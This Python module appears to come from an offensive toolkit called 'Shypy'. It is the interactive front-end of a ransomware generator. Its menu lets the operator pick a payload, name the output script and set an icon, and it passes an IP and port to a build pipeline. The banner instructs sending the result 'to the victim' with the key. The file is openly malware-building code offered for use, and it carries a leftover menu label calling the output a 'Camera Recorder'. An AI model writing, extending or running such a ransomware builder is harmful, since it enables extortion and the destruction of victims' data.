import importlib

from ..utils.module_utils import *
from ..variables.variables import *

class RansomwareGenerator(ModuleUtils):
    """
    The Generator class is responsible for managing the ransomware generation process.
    It provides a command-line interface for setting up the necessary parameters and
    generating the ranswomware.
    """
    def __init__(self) -> None:
        """
        Constructor method for the Generator class.
        """
        super().__init__()
        self.module  : str = "ransomware"
        self.payload : str = ""
        
    def run(self) -> None:
        """
        Runs the main command-line interface for setting up and generating the ransomware.
        Provides options for setting payload, as well as
        displaying available payloads and generating the ransomware.
        """
        self.clear()
        
        print(f"""{COLOR['CYAN']}
            ╔══════════════════════════════════════════════════════════════════════════╗
            ║*                        -  Ransomware Generator -                       *║
            ╠══════════════════════════════════════════════════════════════════════════╣
            ║ NOTE : In order for the program to be successful, it must be sent to     ║
            ║ the victim in the same file with the key, otherwise it will not work.    ║
            ╠═════════════════════════════════════╦════════════════════════════════════╣ 
            ║              Commands               ║            Function                ║    
            ╠═════════════════════════════════════╬════════════════════════════════════╣   
            ║ "set payload" <payload name>        : Set Payload.                       ║ 
            ║ "show payloads"                     : Showing all Payloads.              ║ 
            ║ "generate"                          : Generate a Camera Recorder.        ║
            ║ "back"                              : Back To Shypy.                     ║
            ╠═════════════════════════════════════╬════════════════════════════════════╣
            ║*             Payload                : {COLOR['RESET']}{self.payload}{COLOR['CYAN']}{' ' * (35 - len(self.payload))}║                                             
            ╠═════════════════════════════════════╩════════════════════════════════════╣            
            ║*                               - The Shypy -                            *║ 
            ╚══════════════════════════════════════════════════════════════════════════╝
            \n\n""")
        
        answer = input(f"{COLOR['CYAN']}{FLAG}{COLOR['RESET']}").lower().strip()
        
        if answer == "generate":
            if self.payload == "":
                self.write(message="Please fill in the required fields.", level=4, delay=1, clear=False)
                self.run()
            
            else:
                ransomware_name = input(f"{COLOR['GREEN']}[+]{COLOR['RESET']} The Name Of Ransomware: ") + ".py"
                ransomware_icon = input(f"{COLOR['GREEN']}[+]{COLOR['RESET']} The Icon Of Ransomware (Optional): ")
                
                self.pipeline(
                    module=self.module, payload=self.payload, ip=self.ip,
                    port=int(self.port), name=ransomware_name, icon_path=ransomware_icon)
                
                sys.exit(1)
        
        elif answer.startswith("set payload"):
            try:
                self.payload = answer.split(" ")[2]
                self.run()
            
            except IndexError:
                self.write(message="set payload <payload name>", level=4, delay=1, clear=False)
                self.run()
        
        elif answer == "show payloads":
            self.list_payloads(self.module)
            
        elif answer == "back":
            importlib.import_module("main").Shypy().menu()

        else:
            self.write(message="Invalid Option.", level=4, delay=1, clear=False)
            self.run()